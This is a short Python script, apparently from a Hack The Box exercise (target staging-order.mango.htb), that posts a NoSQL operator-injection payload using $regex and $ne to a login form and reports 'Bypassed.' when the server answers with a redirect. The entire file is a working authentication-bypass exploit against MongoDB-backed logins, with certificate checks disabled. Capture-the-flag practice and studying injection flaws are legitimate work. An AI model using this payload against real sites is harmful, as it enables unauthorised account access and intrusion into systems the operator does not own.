#!/usr/bin/python
import requests
import string

username = ""
password = "nonexists"
target = "http://staging-order.mango.htb/index.php"

headers = {'Content-type': 'application/x-www-form-urlencoded',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
payload = 'username[$regex]=^a.*&password[$ne]=nonexists&login=login'
r = requests.post(target, headers = headers, data = payload, verify = False, allow_redirects = False)
if r.status_code == 302:
    print("Bypassed.")
